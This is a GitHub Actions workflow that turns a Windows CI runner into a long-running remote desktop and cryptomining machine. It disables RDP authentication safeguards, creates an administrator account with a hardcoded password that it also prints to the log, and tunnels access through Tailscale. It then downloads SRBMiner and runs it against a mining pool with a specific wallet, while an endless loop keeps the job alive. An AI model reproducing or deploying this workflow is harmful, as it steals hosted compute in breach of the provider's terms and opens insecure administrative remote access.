name: System-RDP-Compute
on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-latest
    timeout-minutes: 3600

    steps:
      - name: Configure Core RDP Settings
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
          netsh advfirewall firewall add rule name="RDP-Port" dir=in action=allow protocol=TCP localport=3389
          Restart-Service -Name TermService -Force

      - name: Create RDP User
        run: |
          $password = "P@ssw0rd123!" 
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"

      - name: Install & Connect Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
          Invoke-WebRequest -Uri $tsUrl -OutFile "ts.msi"
          Start-Process msiexec.exe -ArgumentList "/i", "ts.msi", "/quiet", "/norestart" -Wait
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-windows-$env:GITHUB_RUN_ID
          $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV

      - name: Download and Setup SRBMiner
        run: |
          $url = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-win64.zip"
          Invoke-WebRequest -Uri $url -OutFile "miner.zip"
          Expand-Archive -Path "miner.zip" -DestinationPath "$env:USERPROFILE\Desktop\miner"
          
          # Create the start.bat inside the new folder
          $batContent = @"
          @echo off
          cd /d "%~dp0"
          SRBMiner-MULTI.exe --algorithm verushash --pool na.luckpool.net:3956 --wallet RRA93CzekuvN6aNV4PBknt87YS6L26mrVD --password x --cpu-threads 0 --disable-gpu
          pause
          "@
          $batContent | Out-File -FilePath "$env:USERPROFILE\Desktop\miner\SRBMiner-Multi-2-4-7\start.bat" -Encoding ascii

      - name: Run Miner in Background
        run: |
          # Navigate to the folder and launch the batch file
          # Using 'start' ensures it runs in a separate window visible via RDP
          cd "$env:USERPROFILE\Desktop\miner\SRBMiner-Multi-2-4-7"
          Start-Process -FilePath "cmd.exe" -ArgumentList "/c start start.bat"

      - name: Maintain RDP Session
        run: |
          $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
          Write-Host "n=== RDP ACCESS READY ==="
          Write-Host "Address: $tsIP"
          Write-Host "Username: RDP"
          Write-Host "Password: P@ssw0rd123!"
          Write-Host "========================n"
          
          while ($true) {
              Write-Host "[$(Get-Date)] Runner Active - Use Ctrl+C to stop"
              Start-Sleep -Seconds 300
          }
